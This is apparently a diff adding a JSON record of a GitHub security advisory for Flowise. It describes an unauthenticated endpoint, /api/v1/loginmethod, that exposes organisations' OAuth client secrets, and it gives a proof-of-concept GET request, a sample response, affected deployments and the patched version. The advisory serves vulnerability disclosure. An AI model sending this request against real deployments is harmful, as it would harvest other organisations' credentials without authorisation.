@@ -1,0 +1,95 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-56270",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-306",
+      "CWE-312"
+    ],
+    "description": "### Summary\nI have discovered a critical Missing Authentication vulnerability on the /api/v1/loginmethod endpoint. The API allows unauthenticated users (guests) to retrieve the full SSO configuration of any organization by simply providing an organizationId. The response includes sensitive OAuth credentials (Client Secrets) in cleartext.\n\n\n### PoC\nThe following request can be sent by anyone on the internet without any cookies or authorization headers.\n\nRequest\n```http\nGET /api/v1/loginmethod?organizationId=<any_organization_id> HTTP/2\nHost: cloud.flowiseai.com\nAccept: application/json\nContent-Type: application/json\n```\n\nResponse: The server returns 200 OK with sensitive credentials:\n```json\n{\n  \"providers\": [\n    {\n      \"id\": \"a04ba769-b810-481d-8d6b-84f8c377dea5\",\n      \"organizationId\": \"bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d\",\n      \"name\": \"azure\",\n      \"config\": {\n        \"tenantID\": \"\",\n        \"clientID\": \"\",\n        \"clientSecret\": \"\"\n      },\n      \"status\": \"disable\",\n      \"createdDate\": \"2025-12-26T18:52:33.453Z\",\n      \"updatedDate\": \"2025-12-26T19:31:56.087Z\",\n      \"createdBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\",\n      \"updatedBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\"\n    },\n    {\n      \"id\": \"eda8bd90-1c45-4aca-933f-3a53d9be4161\",\n      \"organizationId\": \"bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d\",\n      \"name\": \"google\",\n      \"config\": {\n        \"clientID\": \"123455\",\n        \"clientSecret\": \"123455\"\n      },\n      \"status\": \"enable\",\n      \"createdDate\": \"2025-12-26T18:52:33.453Z\",\n      \"updatedDate\": \"2025-12-26T19:31:56.087Z\",\n      \"createdBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\",\n      \"updatedBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\"\n    },\n    {\n      \"id\": \"0d238df0-c89c-4733-bf57-6ec06f58c7e7\",\n      \"organizationId\": \"bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d\",\n      \"name\": \"auth0\",\n      \"config\": {\n        \"domain\": \"\",\n        \"clientID\": \"\",\n        \"clientSecret\": \"\"\n      },\n      \"status\": \"disable\",\n      \"createdDate\": \"2025-12-26T18:52:33.453Z\",\n      \"updatedDate\": \"2025-12-26T19:31:56.087Z\",\n      \"createdBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\",\n      \"updatedBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\"\n    },\n    {\n      \"id\": \"e060ae88-c7f4-4b7c-9bdc-5321963a1648\",\n      \"organizationId\": \"bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d\",\n      \"name\": \"github\",\n      \"config\": {\n        \"clientID\": \"\",\n        \"clientSecret\": \"\"\n      },\n      \"status\": \"disable\",\n      \"createdDate\": \"2025-12-26T18:52:33.453Z\",\n      \"updatedDate\": \"2025-12-26T19:31:56.087Z\",\n      \"createdBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\",\n      \"updatedBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\"\n    }\n  ],\n  \"callbacks\": [\n    {\n      \"providerName\": \"azure\",\n      \"callbackURL\": \"https://cloud.flowiseai.com/api/v1/azure/callback\"\n    },\n    {\n      \"providerName\": \"google\",\n      \"callbackURL\": \"https://cloud.flowiseai.com/api/v1/google/callback\"\n    },\n    {\n      \"providerName\": \"auth0\",\n      \"callbackURL\": \"https://cloud.flowiseai.com/api/v1/auth0/callback\"\n    },\n    {\n      \"providerName\": \"github\",\n      \"callbackURL\": \"https://cloud.flowiseai.com/api/v1/github/callback\"\n    }\n  ]\n}\n```\n### Affected Deployments\n- FlowiseAI Cloud (cloud.flowiseai.com)\n- Self-hosted FlowiseAI instances where the /api/v1/loginmethod endpoint is exposed\n\n### Impact\nAn unauthenticated attacker can harvest sensitive API secrets (Google, Microsoft, GitHub Client Secrets) from any organization on the cloud platform. This leads to complete compromise of the organization's third-party integrations and potential data breaches.",
+    "ghsa_id": "GHSA-6pcv-j4jx-m4vx",
+    "html_url": "https://github.com/advisories/GHSA-6pcv-j4jx-m4vx",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6pcv-j4jx-m4vx"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-56270"
+      }
+    ],
+    "published_at": "2026-04-16T21:20:05Z",
+    "references": [
+      "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6pcv-j4jx-m4vx",
+      "https://github.com/advisories/GHSA-6pcv-j4jx-m4vx"
+    ],
+    "severity": "medium",
+    "summary": "Flowise: Unauthenticated Information Disclosure of OAuth Secrets (Cleartext) via GET Request",
+    "updated_at": "2026-06-24T13:06:32Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "3.1.0",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "vulnerable_version_range": "<= 3.0.13"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-6pcv-j4jx-m4vx",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-306",
+      "CWE-312"
+    ],
+    "description": "### Summary\r\nI have discovered a critical Missing Authentication vulnerability on the /api/v1/loginmethod endpoint. The API allows unauthenticated users (guests) to retrieve the full SSO configuration of any organization by simply providing an organizationId. The response includes sensitive OAuth credentials (Client Secrets) in cleartext.\r\n\r\n\r\n### PoC\r\nThe following request can be sent by anyone on the internet without any cookies or authorization headers.\r\n\r\nRequest\r\n```http\r\nGET /api/v1/loginmethod?organizationId=<any_organization_id> HTTP/2\r\nHost: cloud.flowiseai.com\r\nAccept: application/json\r\nContent-Type: application/json\r\n```\r\n\r\nResponse: The server returns 200 OK with sensitive credentials:\r\n```json\r\n{\r\n  \"providers\": [\r\n    {\r\n      \"id\": \"a04ba769-b810-481d-8d6b-84f8c377dea5\",\r\n      \"organizationId\": \"bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d\",\r\n      \"name\": \"azure\",\r\n      \"config\": {\r\n        \"tenantID\": \"\",\r\n        \"clientID\": \"\",\r\n        \"clientSecret\": \"\"\r\n      },\r\n      \"status\": \"disable\",\r\n      \"createdDate\": \"2025-12-26T18:52:33.453Z\",\r\n      \"updatedDate\": \"2025-12-26T19:31:56.087Z\",\r\n      \"createdBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\",\r\n      \"updatedBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\"\r\n    },\r\n    {\r\n      \"id\": \"eda8bd90-1c45-4aca-933f-3a53d9be4161\",\r\n      \"organizationId\": \"bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d\",\r\n      \"name\": \"google\",\r\n      \"config\": {\r\n        \"clientID\": \"123455\",\r\n        \"clientSecret\": \"123455\"\r\n      },\r\n      \"status\": \"enable\",\r\n      \"createdDate\": \"2025-12-26T18:52:33.453Z\",\r\n      \"updatedDate\": \"2025-12-26T19:31:56.087Z\",\r\n      \"createdBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\",\r\n      \"updatedBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\"\r\n    },\r\n    {\r\n      \"id\": \"0d238df0-c89c-4733-bf57-6ec06f58c7e7\",\r\n      \"organizationId\": \"bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d\",\r\n      \"name\": \"auth0\",\r\n      \"config\": {\r\n        \"domain\": \"\",\r\n        \"clientID\": \"\",\r\n        \"clientSecret\": \"\"\r\n      },\r\n      \"status\": \"disable\",\r\n      \"createdDate\": \"2025-12-26T18:52:33.453Z\",\r\n      \"updatedDate\": \"2025-12-26T19:31:56.087Z\",\r\n      \"createdBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\",\r\n      \"updatedBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\"\r\n    },\r\n    {\r\n      \"id\": \"e060ae88-c7f4-4b7c-9bdc-5321963a1648\",\r\n      \"organizationId\": \"bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d\",\r\n      \"name\": \"github\",\r\n      \"config\": {\r\n        \"clientID\": \"\",\r\n        \"clientSecret\": \"\"\r\n      },\r\n      \"status\": \"disable\",\r\n      \"createdDate\": \"2025-12-26T18:52:33.453Z\",\r\n      \"updatedDate\": \"2025-12-26T19:31:56.087Z\",\r\n      \"createdBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\",\r\n      \"updatedBy\": \"6ab311fa-0d0a-4bd6-996e-4ae721377fb2\"\r\n    }\r\n  ],\r\n  \"callbacks\": [\r\n    {\r\n      \"providerName\": \"azure\",\r\n      \"callbackURL\": \"https://cloud.flowiseai.com/api/v1/azure/callback\"\r\n    },\r\n    {\r\n      \"providerName\": \"google\",\r\n      \"callbackURL\": \"https://cloud.flowiseai.com/api/v1/google/callback\"\r\n    },\r\n    {\r\n      \"providerName\": \"auth0\",\r\n      \"callbackURL\": \"https://cloud.flowiseai.com/api/v1/auth0/callback\"\r\n    },\r\n    {\r\n      \"providerName\": \"github\",\r\n      \"callbackURL\": \"https://cloud.flowiseai.com/api/v1/github/callback\"\r\n    }\r\n  ]\r\n}\r\n```\r\n### Affected Deployments\r\n- FlowiseAI Cloud (cloud.flowiseai.com)\r\n- Self-hosted FlowiseAI instances where the /api/v1/loginmethod endpoint is exposed\r\n\r\n### Impact\r\nAn unauthenticated attacker can harvest sensitive API secrets (Google, Microsoft, GitHub Client Secrets) from any organization on the cloud platform. This leads to complete compromise of the organization's third-party integrations and potential data breaches.",
+    "ghsa_id": "GHSA-6pcv-j4jx-m4vx",
+    "html_url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6pcv-j4jx-m4vx",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6pcv-j4jx-m4vx"
+      }
+    ],
+    "published_at": "2026-04-15T14:06:39Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Unauthenticated Information Disclosure of OAuth Secrets (Cleartext) via GET Request",
+    "updated_at": "2026-04-15T14:06:39Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "patched_versions": "3.1.0",
+        "vulnerable_version_range": "<= 3.0.13"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "FlowiseAI/Flowise"
+}
